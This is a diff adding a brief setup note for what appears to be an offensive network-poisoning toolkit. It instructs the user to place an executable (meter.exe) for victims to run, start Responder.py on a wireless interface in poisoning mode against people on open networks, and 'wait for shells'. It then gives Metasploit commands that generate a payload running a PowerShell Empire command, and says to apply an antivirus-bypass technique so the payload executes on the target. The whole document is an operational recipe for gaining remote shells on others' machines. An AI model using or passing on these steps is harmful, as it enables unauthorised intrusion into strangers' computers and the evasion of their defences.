@@ -1,0 +1,22 @@
+Quick setup and run
+This is for a really noisy one that would work for majority of people 
+in open networks that would run an exe.
+
+Add executable you want target to run and drop in 
+    files/meter.exe
+
+Then run 
+    python Responder.py -I wlan0 -rw
+
+Then wait for shells
+
+
+Generate payload
+
+metasploit
+use payload/windows/exec
+set CMD="powershell command for Empire"
+generate -t c -f /tmp/header.c
+
+Then use your AV Bypass tech of choice to get it to run on target.
+
